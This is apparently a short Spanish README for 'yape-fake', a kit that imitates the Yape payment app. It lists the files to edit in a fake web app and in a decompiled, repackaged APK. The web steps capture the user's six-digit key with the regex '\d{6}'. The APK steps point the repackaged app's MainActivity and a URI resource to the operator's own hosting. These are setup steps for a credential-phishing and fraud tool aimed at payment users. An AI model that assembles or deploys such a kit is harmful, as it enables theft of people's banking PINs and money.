## "# yape-fk" 
- los archivos a modificar en la aplicacion web son:

   + yape-fake/sweetAlert.js   ---> es la alerta que sale al inicio.

   + yape-fake/build/bundle.js  ---> aqui va la clave usar regex  "\d{6}"

- los archivos a modificar en la app (APK) son:

  *debemos llamar a nuestro hosting httts://mihosting.com*

   + base.apk-decompiled/res/raw/uri.txt
   + base.apk-decompiled/smali/yapefake/cincodias/com/MainActivity.smali
   + base.apk-decompiled/sources/yapefake/cincodias/com/MainActivity.java
